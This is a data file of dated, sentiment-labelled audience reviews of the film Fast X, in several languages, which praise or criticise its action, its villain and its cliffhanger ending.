"May 24, 2023",POSITIVE,Insanely good. Never new it would be a cliffhanger. The rock is back.
"May 24, 2023",POSITIVE,I loved everything about this movie from beginning to end.   Jason Momoa and the role he played was a perfect addition to this already star studded cast and magnificent storyline!  Looking forward to the next one!
"May 24, 2023",POSITIVE,everything was fantastic
"May 24, 2023",NEUTRAL,Jason Momoa steals the show and carried the movie! Loved the plot yet still annoyed at how much dead characters they keep bringing back. Makes for the “actual” deaths lack meaning or suspense anymore.
"May 23, 2023",POSITIVE,Action packed from start to finish. Very compelling story and entertaining. Go see it! It was a good movie!
"May 23, 2023",POSITIVE,awesome movie love Jason Momoa as a villian
"May 23, 2023",POSITIVE,It's what you come to expect from these series of movies. It was very exciting and we both enjoyed it.
"May 23, 2023",POSITIVE,Lots of action decent and plot and very exciting. Don’t like cliffhangers and this one was a huge one!!
"May 23, 2023",POSITIVE,It was great to see past characters involved. I didnt like Momoas character. A lot of over the top car stunts. Glad to see the Rock back. Lets see what Fast 11 brings.
"May 23, 2023",NEGATIVE,"hated the ending, cliff hangers are great for TV but not for movies when you have to wait 2 years to see what happens. lord of the rings was one of a few exceptions. and even they wrapped up every installment so you left the theater with anticipation rather than frustration.  plus that franchise was one movie broken into multiple parts in theaters only one year after the last. Disappointed with who ever made this decision. will not refer this movie, just wait for the next installment to update you on the previous one."
"May 23, 2023",POSITIVE,Very good good movie
"May 23, 2023",POSITIVE,"Jason Momoa was is the show, to go a long with strong performances by Vin Diesel and John Cena.
So basically, the whole Fast X film acts as a first act for the next two films to follow up. I totally get it. This first was a great warm up for what's to come for the next couple of Fast and Furious movies. Cliffhangers galore at the end of Fast X. No one truly stays down in the Fast and Furious franchise. Which in some cases ruin logic, when we find out who tried to 'off' who. And they might be working together all this time, all along. Which, when you look at the film those events occurred in, there's no way they survived. So maybe the world of the Fast & Furious movies is the after life of that universe or the characters are being resurrected by some supernatural car, or all the fatalities were faked to look real in order to go into hiding at a predetermined location. Why? We'll find out next film. I don't watch Fast & Furious movies for logic and reason, even though I love to deduce and theorize certain plot points of film and TV shows. I give 'Fast X' 4 out 5 stars ⭐️⭐️⭐️⭐️/5 and .25 more to this review for total of 4.25/5.
Hopefully we get more of John Cena's characters. Like I said, nobody stays down in Fast & Furious"
"May 23, 2023",POSITIVE,Very movie but cheesy as always
"May 23, 2023",NEGATIVE,"It's like the producers put a bunch of little kids in a room with a lot of toy cars; observing them play with said toys, & using those ideas for their action scenes. Over the top unrealistic, cringe level, cheap movie/lousy story line vibes."
"May 23, 2023",POSITIVE,Was a pretty good movie but the sound could be a little lower
"May 23, 2023",POSITIVE,Excellent acting full of action. Loved the music.
"May 23, 2023",POSITIVE,"Seen them all, enjoyed most of them. This was a five-star summer action movie."
"May 23, 2023",POSITIVE,it's was super super super good 👍👍👍👍 I'm a dj. dj. Shawty E. 📀
"May 23, 2023",NEGATIVE,It’s just constant fan service at this point to the extent that makes it actually cringe. Pictures on walls of old movie scenes like wtf? I literally kept falling asleep during the middle hour of the movie.
"May 23, 2023",POSITIVE,The usual non-stop action but jumped back and forth between the allstar cast
"May 23, 2023",POSITIVE,Movie was 🔥🔥🔥🔥🔥 can’t wait to see the next one
"May 23, 2023",NEUTRAL,"It’s about what you would expect from a fast and the furious movie ridiculous action, cheesy dialogue, car mayhem and a plot that doesn’t take itself all that seriously which is a part of the charm for me personally. You turn your brain off and you just enjoy a crazy action movie that will most definitely break the laws of physics, but it isn’t fast and the furious these days without that. I like that they tried to re-create a street race, but it really didn’t have the same charm as it once did. Overall, it’s a decent 6.5/10."
"May 23, 2023",POSITIVE,"ALWAYS LOTS OF GOOD ACTION, I LOVE THAT, A MUST SEE IF UR INTO THA FAST 5 SAGA"
"May 23, 2023",POSITIVE,outstanding movie. beautiful movie 10 out of 10
"May 23, 2023",POSITIVE,"Assisti no cinemax,  filme ótimo muita ação e atores que amo"
"May 23, 2023",NEUTRAL,Liked the action. Hated the ending. A movie shouldnt end like a television series.
"May 23, 2023",POSITIVE,awesome as always & as a fan of the all of them.
"May 23, 2023",POSITIVE,Nothing at all. Really liked Fast X & great to see actors come back to it!!!
"May 23, 2023",POSITIVE,"It was  GREAT and the action was awesome. I just got so tired from this movie had me on my toes ,,,need to take a NAP"
"May 23, 2023",POSITIVE,Great action packed movie!! Awesome cast and very enjoyable watching it in IMAX!!
"May 23, 2023",POSITIVE,It was very entertaining from beginning to end. The stunts and special effects were amazing. I was disappointed that I have to wait for Part 2 to find out what happens. It ends with a cliffhanger.
"May 23, 2023",POSITIVE,Like very much. Didnt disappoint.
"May 23, 2023",POSITIVE,"Lot of action done right , great filming. Great cast didnt see that end coming we stayed and watched while everyone else left pretty cool surprise . Loved the humor in movie. My significant other felt same way she knew some of the female actors"
"May 23, 2023",POSITIVE,"Liked everything about the movie. Loved Jason Momoa as the villian, he was funny!"
"May 23, 2023",NEGATIVE,"If you want a half decent action film, go and see it. If you're going for any other reason, in my personal opinion, it wasn't that good. The special effects left a lot to be desired, the plot was predictable at best. ((((((SPOILER ALERT, SCROLL DOWN TO READ)))))), but yeah, enjoyable action film, otherwise, quite a let down.




The ending was VERY dissatisfying, confusing and anticlimactic. But I'm sure in true F&F fashion, they'll find a way of wiggling out of the corner they have wrote themselves into, yet again..."
"May 23, 2023",POSITIVE,Lots of action with the whole family values thing. The end was too abrupt and bit of a disappointment.
"May 23, 2023",POSITIVE,actions and great plot.
"May 23, 2023",POSITIVE,You know what your getting with the fast saga! But yet this film was a little more fresh then the last few. Can’t wait for part ✌️
"May 23, 2023",NEGATIVE,"Can someone for the love of god stay dead in this movie franchise, like seriously, why be sad about people dying when you know they will come back in 2-3 movies."
"May 23, 2023",POSITIVE,The movie was excellent
"May 23, 2023",NEGATIVE,Even more ridiculous than usual but without the fun
"May 23, 2023",POSITIVE,It was action packed and very good movie
"May 23, 2023",POSITIVE,I loved Fast X! Such a fun movie. Jason Momoa absolutely crushes it as the villain. I cannot wait to see what they do next.
"May 23, 2023",NEUTRAL,"Well, what can I say?! It's, like always, absolutely ridiculous, and I came to the conclusion that Toretto definitely flies a lot more inside some car during his flicks than Superman does in any of his movies. Thus said I naturally laughed my butt off in many of the scenes. But even though, Edition 10 is not as idiotic as 8 or 9. There are some good fighting and action sequences and all together it is quite some fun, mainly on the absurd and ridiculous side, where one naturally has to completely switch off one's brain and discard any laws of physics, but still fun. And as always there is too much of that moronic ""Family above all"" ChitChat which, not only by now, but already 6 or 7 editions ago, became very lame and annoying. Anyway I give the whole crazily over the top show 7 out of 10 points as it is quite entertaining. Unfortunately Momoa was a complete miscast for the vengeful maniac (and I normally like the guy)."
"May 23, 2023",NEUTRAL,"The Aqua Man who laughs. The fun part of these movies is watching Vin Diesel attempt to be a serious actor while everything else is ridiculous around him. At times, the movie thinks it's not what it is, but Aqua Man is priceless"
"May 23, 2023",POSITIVE,Very good movie. I just hate I have to wait until Fast 11 to find out what happened.
"May 23, 2023",POSITIVE,I was saddened by the ending I was hoping it was going to a Happy Ending with a happily ever after romance get my memory back type of way but I still loved it and hope that the New Team that was created will bring on new adventures for the new Guardians
"May 23, 2023",POSITIVE,Very action packed and left it open for another on of course.
"May 23, 2023",POSITIVE,It was an awesome movie with incredible stunts.  Awesome cliff-hanger at the end.
"May 23, 2023",POSITIVE,"The comedy and drama was on point , villian as menacing as i excpected, it was worth ma mula"
"May 23, 2023",NEUTRAL,"A lot of fun if you're already invested in the series. If you're not, a lot of this will come off as nonsense spectacle. I enjoyed the ride, but hope the place where it cuts off is a bit annoying. I hope the next one ends with a lot more closure."
"May 23, 2023",POSITIVE,Best movie I ever went to in my entire life. WOW
"May 23, 2023",POSITIVE,Thrilling from beginning to end it was such a great ride.
"May 23, 2023",NEGATIVE,"Based on just mindless fun action, then yeah you could argue its ""good."" But if you want substance and some semblance of stakes, then no, this movie make you indifferent to everything possible. Random subplots that clearly are added to force more films (literally confirmed that this is the case) that could've easily been taken out and finished in this one movie. The pacing was just so unbearable, [SPOILER WARNING.....] they went from a bomb possibly blowing up the Vatican to a street race in Brazil? HUH? At least in the other movies they gradually built up to the ultimate set piece and ended, here, they'll drag you along to another film that you'll pay 12 bucks for in the future."
"May 23, 2023",POSITIVE,Awesome! Can’t wait for the finale!
"May 23, 2023",NEGATIVE,"The series that won't die ""as well as the entire cast""

Kill one, they come back in the end credits of an upcoming movie..

Shock value trick they've used into the ground."
"May 23, 2023",NEGATIVE,This was the dumbest movie.......couldn't even finish it and left really early.
"May 23, 2023",POSITIVE,it was just another fun addition to the Fast and Furious series.
"May 23, 2023",POSITIVE,LOVE LOVE LOVE IT!!! Great movie starts tying up different characters with in the fast and furious series. Can’t wait till next 2 movies come out and see what happens next due to the cliffhanger ending. Hang around for a mid-credit scene.
"May 23, 2023",POSITIVE,"It is an absurd movie and little by little they have been showing us that with each movie that comes out, but that is what makes it entertaining, imaginative and to have a good time."
"May 23, 2023",POSITIVE,It was great as always. Cant wait for the next installment
"May 23, 2023",POSITIVE,"I enjoy the message, which is “Fomily” and the soundtrack has gotten better over the years. This particular installment of the franchise wasn’t so over the top as in years past. A must see, especially in ScreenX, Dolby Cinema, IMAX or 4DX. 🌄"
"May 23, 2023",POSITIVE,"Amazing work, it’s an ending that not a lot will expect."
"May 23, 2023",POSITIVE,"Nos trae de vuelta a la familia, y las escenas de acción siguen siendo impresionantes. Es una película totalmente disfrutable y entretenida."
"May 23, 2023",POSITIVE,"Way better than the fate of the furious and fast 9, Jason Momoa was surprisingly a good villain who posed a real threat to Dom, most of the stunts were good, some scenes in movie were silly though and did not have anything to do with the overall plot, there was also a lot of plot holes and the ending was a meh, but there was a good race scene, John Cena as Jakob Toretto was also good in this one, and Vin Diesel said family a load of times, ignore the critics, this movie is light hearted, fun to watch and eat popcorn, it is a movie that needs to be watched in front of the biggest screen possible."
"May 23, 2023",POSITIVE,Best one yet!!! No spoilers!!! It did NOT disappoint
"May 23, 2023",NEGATIVE,These dudes have turned into the Avengers. Entertaining though.
"May 23, 2023",NEGATIVE,"Nothing works in this movie. The action scenes are bad and the characters are cringe. From a long series of bad movies, this one stand out as the worst of them all."
"May 23, 2023",POSITIVE,Went twice over the weekend. Really enjoyable action movie. It maintains the trend of being over the top so you can't think into it too much. Jason Mamoa delivers big time.
"May 23, 2023",POSITIVE,I think this was a great movie I hope they come out with other movie the movies are great and  amazing too the people are great all them in the movies too
"May 23, 2023",NEGATIVE,It was the most ridiculous part of this movie I couldn't understand the topic I've been watching cus of Paul walker this is the most stupid part there's nothing that I can match what they're showing.
"May 23, 2023",NEUTRAL,"1st of all, Jason Momoa's character is the saving grace of this film. Momoa pulls off a great performance as a villain and his character is very well written. The Fast series is one of my favorite franchises of all time and with that being said I enjoyed seeing a new film on the screen, however… this was a non-stop action film that began to get a little boring and downright cheesy at times. A lot of the action scenes were a little ""too much"" over the top and almost annoying at times. I mean, how many times can you blow up, smash, shoot up, and drop Dom's car and it still keeps ticking without fault? Also, some of the comedy that is typically classic and hilarious in prior films between Tez and Roman really fell flat in this film. At the end of the way it was worth a watch and I am excited for future films, I just hope they do better than they did for this installment of the franchise."
"May 23, 2023",NEGATIVE,Don't listen to the bots this franchise died long ago and this movie the worst of them all
"May 23, 2023",POSITIVE,Jason Mamoa was awesome.
"May 23, 2023",POSITIVE,This was a good movie! I haven't enjoyed the latest ones since Fast Five. This one is good.
"May 23, 2023",NEGATIVE,"This is the worst movie of the year , don't spend money on it wait for it till release on digital"
"May 23, 2023",POSITIVE,"o filme erra e acerta em alguns pontos.
Pontos Negativos: Ludmilla no filme foi uma participação tosca, alguns momentos o humor nao funciona e deixa a cena meio chata.

Pontos positivos: o humor, assim como nao funciona em certas ocasiões, em outras funciona muito bem! mas o maior acerto de todo o filme, é sem dúvidas o VILÃO! Jason Momoa mandou bem demais nesse papel, personagem dele tá estilo Coringa das idéias, a morte do Jacob também é bastante pesada e dolorosa.

esse filme acerta e erra promete porradaria, ação e entrega bem, mas tem alguns momentos peca e erra.

então esse filme comigo tem um 8,5."
"May 23, 2023",NEGATIVE,I guess its based off a video game?This movie is so unrealistic I laughed thru most of it.The best part of the movie was the uncle and kid.
"May 23, 2023",NEGATIVE,"This movie was the worst movie I’ve ever seen. Cars don’t fly. Who are we kidding? Also, the story made no sense. I couldn’t believe how bad this movie was. The earlier movies were watchable. This was shockingly bad. "
"May 23, 2023",NEGATIVE,"Please, please let this be the last one."
"May 23, 2023",POSITIVE,This one was surprisingly good. Much better than their other recent movies
"May 23, 2023",POSITIVE,Toujours aussi bon de se détendre devant un Fast and Furious.
"May 23, 2023",POSITIVE,"The whole movie was awesome from beginning to end love when it's tons of action,cnt wait for the next part to this ending"
"May 23, 2023",POSITIVE,I like that old characters are coming back and Paul Walker's daughter was in the film and I wish that she would come back for more.
"May 23, 2023",NEGATIVE,Waste of time terrible special effects what a joke
"May 23, 2023",NEGATIVE,"Terrible. I love the FF franchise, but this was just so bad and stupid."
"May 23, 2023",NEGATIVE,"Vin & the team have gone from committing theft and robbery of truck drivers to theft and robbery of their fans.  We have officially gone from a movie series about cars and car culture to the most ""nonsensical Hollywood"" production possible.

To Justin Lin and the team, please bring back the cars, the tuning culture, and the sense of community.  We don't need show downs between all our ""favorite"" characters - just give us good driving scenes, bring us along for the tuning of cool new vehicles, and let us feel like a part of the underground street racing community - not 30 second clips of girls in provocative clothing dancing, only to see 3-5 second clips of a car.

Everyone loved the original Supra because we ""saw"" the transformation"", felt with the characters, and knew the feeling of building a car to go fast.  There was a story line - a mystery to be solved.

Now, every scene is a new ""hot spot location"" around the world with the same ""Dodge Charger"" or Hellcat Challenger - jumping off bridges, swinging off helicopters, and landing out of airplanes.

This movie lacks any sort of logical story line, has overly cheesy scripting, and only had one cool car - an early 240Z with a widebody with the mentioned of an RB.  With (1) actual race scene in the entire movie, I am left wanting and disappointed - do better.

Save your money and just re-watch the dying of a franchise in Fast Six thru Nine and be doubly entertained.  As a true car enthusiast, Paul Walker would be disappointed - I am disappointed.

I hope Justin Lin and team reads this because the feedback needs to be heard."
"May 23, 2023",NEGATIVE,“Turn off your brain and enjoy some dumb fun.” -Fast Fans Me after watching it: Ummm… k. Wow…That was a big pile of crap. More like Dom and Dumber. Have to agree with Angry Joe… we live on bizarro world. 
"May 23, 2023",NEUTRAL,It was pretty good not going to lie stopped at movie 6 and now I'm back waiting for the next one
"May 23, 2023",POSITIVE,I love it!! Because they great action movies and I cant wait see next two years for fast furious X part 2
"May 23, 2023",POSITIVE,action packed from start to finish
"May 23, 2023",POSITIVE,"The movie was very good, but I did not realize that it would end like it did, and left it unfinished. I read the movie will come to an end in 2025, which was a huge disappointment!!!!!!"
"May 23, 2023",POSITIVE,"The movie was EXCITING, AMAZING, HEART RACING! The theater on the other hand was disappointing. Will go and see it again, but not there."
"May 23, 2023",NEGATIVE,"No story line, better to watch animated cartoons instead of watching action scene in this movie, another disappointment."
"May 23, 2023",POSITIVE,Amazing! Never have I thought that it would end on a cliffhanger. Dwayne Johnson is back.
"May 23, 2023",NEGATIVE,Leterrier disappoints with a movie that tries much too hard to appeal to his predecessors. The action was similar to other Fast movies but plot and characters was bar none the worst in the series thus far. Diesel's character remains as stale as every and another forgetful villain makes this movie barely worth watching a trailer for.
"May 23, 2023",NEGATIVE,"I kept falling throughout the whole movie, people around me could not enjoy the movie"
"May 23, 2023",POSITIVE,"I really enjoyed the movie and how they always include Brian and things from the past to tie the present together. I did not like the Cliff hanger at the end, but that means another movie is coming, so excited about that. :-)"
"May 23, 2023",NEUTRAL,"SPOILER ALERT!
For once, they had a very good story with lots of potential, but if you keep bringing people back from the dead and make normal people more powerful than the avengers...you're killing the story.
If you really want the audience to hate the bad guy, let the person who they killed, stay dead lol.

Also, Dom's son is a full on black child. How is that possible? The kid is only 1/4 black since Dom is half black and his mother is Brazilian. 

Jason Mamoa did a great job! Happy to see Jason Statham again too. But, Brie Larson has no business in this franchise. Her role was pointless, sorry. Why not make a new badass character instead of pushing female actresses in roles where nepotism is underlined in the story? I also think it's still weird that Han is alive and even weirder that Giselle is too. These characters are unbreakable. The new Justice League of America."
"May 23, 2023",POSITIVE,Cool  too bad that is their  last movie
"May 23, 2023",POSITIVE,"Exactly what it should be. Entertaining, stupid story lines. Just plane fun."
"May 23, 2023",POSITIVE,"After all the alpha villains, it was really cool to have a joker style villain. I strongly recommend this for anyone especially fans of the series that might have left after the stunts got crazier and crazier."
"May 23, 2023",POSITIVE,The action was non-stop.
"May 23, 2023",POSITIVE,The suspense knowing that there will be another one
"May 23, 2023",POSITIVE,"Seriamente es una película que está sacada de chiste pero la trama del villano hace verla en un punto muy diferente y mejor, es una saga que se mantiene y una de las mejores;) y eso sí que nunca falte el Charger de toreto mítico."
"May 23, 2023",POSITIVE,Action-packed as always. Excited for the next installment.
"May 23, 2023",NEGATIVE,"I really tried to enjoy this movie, not sure what they are trying to archive with this one! Messy and ridiculous action scenes, too may cast members (some have less than 5 min screen time) and not as funny as the previous movie,"
"May 23, 2023",POSITIVE,Great for 2.5 hours away from reality as that is what movies are for-many story lines in one and seems it is leading into a Fast 11...
"May 23, 2023",NEUTRAL,jeśli nie oglądałeś poprzednich części to nic nie szkodzi bo tutaj zobaczysz powtórkę the best of z serii. Ale Jason Momoa w tym filmie to czyste złoto
"May 23, 2023",NEGATIVE,"For a film that was over 2 hours long there was zero story to it, and was literally Dom talking about family,  Letty shouting Dom like she does in every F&F film. Roman being the usual loudmouth who brings nothing to the plot, same could be said of all the ""Family"". A grandmother that hasn't ever been mentioned in any of the previous 9 films, suddenly appears and disappears.
All the previous characters just turning up for 30 seconds of screen time was ridiculous to say the least, they brought nothing to the film and didn't really move the ""plot"" along, not that there was a plot. 
It really was stupid ending it on a cliff hanger and then expecting people to have to wait 2 years until Fast XI is released.
Overall it's a film franchise that should of be killed off many years ago."
"May 23, 2023",NEGATIVE,There is absolutely nothing good to say about this movie. I'm a fan of the franchise but just no
"May 23, 2023",NEGATIVE,Fast X should have never been made. 3/10
"May 23, 2023",POSITIVE,"Esto es cine puro, la sirenita es una M…. Por su actriz y manchan la imagen"
"May 23, 2023",POSITIVE,"This movie is fuckin good, oh god i wish i can fuck with vin diesel"
"May 23, 2023",NEGATIVE,to much action no story x
"May 23, 2023",POSITIVE,Better than expected. Can’t wait for the final conclusion of this franchise.
"May 23, 2023",POSITIVE,Loved the action. Yes its unrealistic. Isn't the reason why we watch movies?
"May 23, 2023",NEGATIVE,Es una vergüenza ya. Nada que ver de cómo fue en sus inicios
"May 23, 2023",POSITIVE,Entertaining as always ! MAMOA DID THE DAMN THANG
"May 23, 2023",NEGATIVE,Fell asleep towards the end.. that should say a lot.
"May 23, 2023",POSITIVE,The action was incredible!!
"May 23, 2023",POSITIVE,The best of the best...of the best !!!!!!!!!!!!!!!
"May 23, 2023",NEUTRAL,While as usual there are quite a few eye rolling moments in this movie. But that's par for the course in the Fast series. And as usual the dialog seems to have been written by a twelve year old. But Jason Mamoa's performance as Dante the antagonist to Dom saves this movie. If not for Mamoa's performance this film would have been a cringy comedy due to its silly dialog and ridiculous stunts. But Dante is one of the best antagonists in the Fast series. Mamoa's performance is far and away better than anyone else in this film. He carries the whole movie. So if you're a fan of the series you should definitely give it a shot. If you can't get past the unbelievable stunts and the cheesy dialog you should probably just wait for streaming.
"May 23, 2023",NEGATIVE,trash. and the franchise has been trash for quite a while now
"May 23, 2023",POSITIVE,Excellent fantastic movie!!!!!! I love you all God Bless you all!!!!!
"May 23, 2023",NEGATIVE,"Una entrega rellena con las partes claves de todas sus antecesoras, que va desde zombies hasta lograr vencer la velocidad del sonido, y cosas  inimaginables con un carro potente; una saga ya convertida en palomera y para entretener en un día de cine cualquiera... Esta vez se pasaron de ""tengo fe"" ..."
"May 23, 2023",NEGATIVE,Malísima.  No pierdan el tiempo ni el dinero
"May 23, 2023",POSITIVE,It was amazing!! 10/10 recommend💯💯
"May 23, 2023",POSITIVE,"An improvement over F9, Fast X might be quite silly and over-the-top as usual but it does a good job setting up the beginning of the end with Jason Momoa having the time of his life playing against type as the Big Bad whose hammy yet still a legitimate threat, higher stakes, memorable action sequences and plot twists that are easier to swallow than the soap opera nonsense of the last film as well as a mid-credits surprise given the fallout of some behind-the-scenes drama over clashing egos. There are some truly dumb moments like Han getting high on a drugged muffin that, as far as I know at the time of writing this, hasn't actually affected the plot but overall this is yet another good old-fashioned bit of fun where the characters are just as in on the joke as the audience are. I mean, how can you not be amused by some of John Cena's airport-to-airplane shenanigans with his nephew in tow? And that's without getting into how even people who don't follow wrestling are likely to point out that a muscular dude like him would stick out like a sore thumb. I hope Fast X breaks even at the box office since I'm worried that audiences might be alienated by the cliffhanger ending since, if you didn't follow the Internet news, this movie, like Dune 2021, gives no indication that it's part of a Movie Multipack outside of the ""The End of the Road Begins"" tagline. And we really don't need another Divergent Series: Allegiant situation on our hands. Hopefully the next two parts will live up to the hype. Just go easy on the trailers next time. Fast X's trailers were a tad too long and ruined the surprise when it came to action sequences. Just a bit of advice for Vin Diesel, Universal and whomever edited the trailers."
"May 23, 2023",POSITIVE,It was a lot of action right away so the plot didn’t have much to build up to. But I love the movie and all the actors and actresses! Can’t wait for the next one!!
"May 23, 2023",POSITIVE,Liked the action sequences even if the overall story line was weak.
"May 23, 2023",NEUTRAL,"Fast x 

❌Spoilers❌This is an improvement for f9 and John Cena's character. In so many ways. He feels more like peacemaker, which makes him so much more fun, because in F9 he had no personality and he barely even had screen time and I love John Cena so it's great to see him doing his shtick here also, that nail painting sequence was hilarious I don't know what it is but Jason Momoa just elevates it with his fun but truly menacing villain. I love seeing Daniela Melchior in another film, because I absolutely love her as ratcatcher two in the suicide squad, and this film has a lot of suicide squad actors like Pete, Davidson, John Cena, and Daniela Melchior so that's actually pretty cool because I absolutely love the suicide squad and it's one of my favorite DC films but now, getting into the nitty-gritty of it all damn, that is one Hell of a cliffhanger this is like the infinity war fast and furious saga. I cannot wait for fast and furious 11. This movie is exciting. I'm pretty sure not everybody's dead like I'm sure Jacob is sadly because he just started to get good but I'm fine with it because the family is too big at this point so they kind of need to get rid of some as much as I hate to say it but fast X is exciting three part conclusion that I can't wait to see if this is just the start. I think they're on a roll. I probably need to watch this again getting into more of my negatives. I'm sad that Bree Larson didn't have a bigger role it's like nobody knows what to do with her in Hollywood but I'm glad she's in here I know people don't like that Shaw is a good guy now and that he just kinda became their family I will say that's a little weird but cipher how can you redeem cipher she was going to kill a baby I don't know that's a little bit of a stretch. Also, I would've liked them to have a little bit more time with Shaw and Han but they don't. I also feel like the series doesn't really know what to do with Han either but I'm sure they'll find something he's not dead, right right I don't know this was a very exciting entry can't wait to see what they do next 7/10"
"May 23, 2023",POSITIVE,Dinámica creo que quieren regresar a las raíces de la saga. La acción  muy buena.. claro llegando a lo fantasioso  pero cumple con engancharnos a lo siguiente...
"May 23, 2023",NEGATIVE,I think fast and furious should have died on the 7th movie...
"May 23, 2023",POSITIVE,Non-stop action as always. Franchise never disappoints on that. Jake proves himself as a true Toretto. Dante makes you love and hate him. Overall my family and I love it.
"May 23, 2023",NEUTRAL,"Good movie. Great cast of characters and a few great funny parts where perfect. Ending sucked!!!!!!! Not sure if I will go back to see another, just because of the stupid ending. Everyone in the theatre was mumbling when it ended. I heard a few people say WTF, is that it? SMH"
"May 23, 2023",NEGATIVE,"My hopes where high, I went Thursday, opening night to see the movie. Hoping for movie that was toned down and closer to the original movie in franchise that started it all, compared to the later iterations. Unfortunately not so, they simply doubled down on all the craziness from Fast V and up, literally reusing material from movies 5-9 but some how tieing it together in a worse package. (Spoiler… Kind of….) There seems to be absolutely no linearity it's almost like 5 different plots happening at once that are tied together by nothing more than ""Family"". Characters show up merely to make a cameo adding little to nothing to the plot and than disappearing never to be seen again. I hope you know the movie ends on a cliff hanger because I didn't and that was not a good moment. They tried to match Marvels Infinity War strategy but while marvel left you a feeling of sorrow, worry, and defeat that made you feel one with the characters and match there will to continue, Fast X will leave you exhausted, confused and frankly wanting the an ending simply to no longer perpetuate this dying franchise. I will wait for fast X(2fast) fast Xl or whatever they call it to be streamable watch it at home and finally end this series that has strung me along only because of the nostalgia of watching it growing up when I was 5 and see cars actually progress, get fast, and race and not whatever this is now. I'd probably give it 1 star but god that Dodge charger is still beautiful, that's about it."
"May 23, 2023",POSITIVE,"It's was awesome I freaking love the action scenes. 


Glad to see the rock is back."
"May 23, 2023",NEGATIVE,"They are trying way too hard now. 
This one was way worse than the last bad one."
"May 23, 2023",POSITIVE,"Fast is back! Super entertaining film, you can’t go into it excepting anything different than a fast movie but really excellent job, fun from start to finish"
"May 23, 2023",NEUTRAL,Still has too many unrealistic stunts The story wasn't bad though.
"May 23, 2023",NEUTRAL,I only keep watching because I grew up with FF. it’s being milked and they should really pay the writers more instead of getting high profile actors.
"May 23, 2023",NEGATIVE,"The same crap every time, its a shame that people enjoys this type of garbage, it shows how bad we are makong this a blockbuster."
"May 23, 2023",NEGATIVE,Pointless waste of time zero plot. Just random explosions with a story line less complex than a children's story. Cash grab.
"May 23, 2023",POSITIVE,I like all the action and the suspention
"May 23, 2023",POSITIVE,Jason Momoa stole the show! He was the best part of this movie!
"May 23, 2023",NEGATIVE,It could have been better. It would be fine to wait and see it out of theater. It did not need to be two hours long and it kind of dragged on. The movie was also very predictable as well. If you don’t remember the previous characters in the movies you may need to watch them again before seeing the movie.
"May 23, 2023",POSITIVE,I loved everything just the ending is what caught me off guard
"May 23, 2023",NEUTRAL,Action packed!  Good movie to past some time.
"May 23, 2023",POSITIVE,fucking awesome 👍👍👍
"May 23, 2023",NEGATIVE,Not good as the previous ones
"May 23, 2023",POSITIVE,Amazing ride!!! Movies like this one is the reason that Theaters exist!
"May 23, 2023",POSITIVE,It was everything you expect in a fast and furious movie.
"May 23, 2023",POSITIVE,great like rest of them plenty of actions thru  out the movie end ing left it open fo rone more i think but said all had to die
"May 23, 2023",POSITIVE,Liked post credit scene and all cameo’s
"May 23, 2023",NEGATIVE,"Time to retire this franchise.  Zero original ideas now.  Just more speed, explosions, and flying cars. What's next?  Fast Rock??"
"May 23, 2023",POSITIVE,the movie is really good. i didn't expect that twist in the end. i got goosebumbs for the end credits. the stunts are really good and the movie also have little funny. over all. good movie to watch
"May 23, 2023",POSITIVE,They brought the cars and action like always. It seemed to go by fast.. Everyone was great. Momoa was annoying.. Too much of him. I actually seen Cena with all that momma action going on.  That's how annoying he was. There was a surprise that I wasn't expecting....
"May 23, 2023",POSITIVE,"Definitely seeing this again! 
This movie was so much fun! A little bit of everything. Edge of my seat gut wrenching action. My muscle car was represented finally! Jason Momoa, WHOA! Can't wait for the next one."
"May 23, 2023",POSITIVE,Much better than 8 and 9
"May 23, 2023",NEGATIVE,"Way Too Much CGI Crap..
Last Mad Max, look it up..
90% of stunts REAL.."
"May 23, 2023",NEUTRAL,Cheesy as usual but action packed; trying the understand the ending and story woven layers 
"May 23, 2023",NEGATIVE,"This movie is ridiculous. As the last film in the franchise, the least expected was to bring back the essence of the first films. Unfortunately this did not happen at any time and with each scene that passed I hoped that it would be the last."
"May 23, 2023",POSITIVE,It was one of the best movies in the entire series
"May 23, 2023",POSITIVE,"The special effects were great, but the movie picture quality for being IMAX had flaws. it was out of focus at times. Some of the acting was bad too. We still had a good time, but not 4 stars"
"May 23, 2023",POSITIVE,"Fans know & expect that the stunts will be over the top and unrealistic, but that is the fun of it. I went into it with this mindset and thought it was fantastic and fun!"
"May 23, 2023",POSITIVE,Movie was great!!! I want more street racing instead of Mission Impossible for that five star.
"May 23, 2023",POSITIVE,Many Top Notch Actors/Actresses most incredible experience on the big screen 10/10! Would watch this when it hits Blu Ray!
"May 23, 2023",NEUTRAL,we need Bryan O'Conner
"May 23, 2023",NEGATIVE,"Unbelievable storyline 
and unbelievable CGI! Looks more like an animated action movie..."
"May 23, 2023",NEGATIVE,"Why is every movie now doing comedy when it is not comedy?  I thought the ""villain"" was gross and acted like an idiot."
"May 23, 2023",POSITIVE,All the actors!! We enjoyed it very much. Cant wait tell the next one.
"May 23, 2023",NEGATIVE,Not much of a story line. I thought Jason Mamoa’s acting was terrible!  The others’ acting was good!
"May 23, 2023",POSITIVE,Love this movie!!! Brings me right back to 2001!!!
"May 23, 2023",POSITIVE,Excelente villano 👍
"May 23, 2023",NEGATIVE,The last fast and furious movie was Tokyo drift. . . WHAT F UCKING HAPPPEND IN THIS MOVIE
"May 23, 2023",POSITIVE,I like all the acción!!
"May 23, 2023",POSITIVE,Lots of action. End of movie makes you excited for next installment
"May 23, 2023",NEUTRAL,Another fun film in the Fast and the Furious saga.
"May 23, 2023",POSITIVE,"Okay the action was there as always but what really got me laughing was Jason Mamoa, his character was what kept the attention."
"May 23, 2023",POSITIVE,"Forget about the negative ratings. If you like the F&F saga then you *really* want to watch Fast X. It's +2hrs of non-stop action. Just go watch it, you won't regret it!"
"May 23, 2023",POSITIVE,what u expect from fast movies is all in this …i don't understand y people cry about over cgi this and that but then they say they love marvel which is also filled with cgi
"May 23, 2023",NEGATIVE,The story line sucked it was the worst
"May 23, 2023",POSITIVE,Go watch it with faith
"May 22, 2023",POSITIVE,"I love the Fast X. The movie was done terrific. All the cast members kept you on the edge of your seat and they are all talented. This is one of the best in the series. I wish there was more, but I understand why they stopped it to a certain point in order to keep it going."
"May 22, 2023",NEUTRAL,Unbelievable…incredulous…all over the place but full of action.
"May 22, 2023",POSITIVE,This movie was INSANE!! Jason Momoa absolutely killed his role as the antagonist.
"May 22, 2023",POSITIVE,"Just turn your brain off and watch fast car blowing up, shouting, shooting, fighting, and have fun!

It's not Shakespeare."
"May 22, 2023",POSITIVE,"That's great movie, I liked so much."
"May 22, 2023",POSITIVE,This is the best movie yet FANTASTIC
"May 22, 2023",POSITIVE,I loved it from start to finish. The movie went by so fast from start to finish. I would see it again very soon.
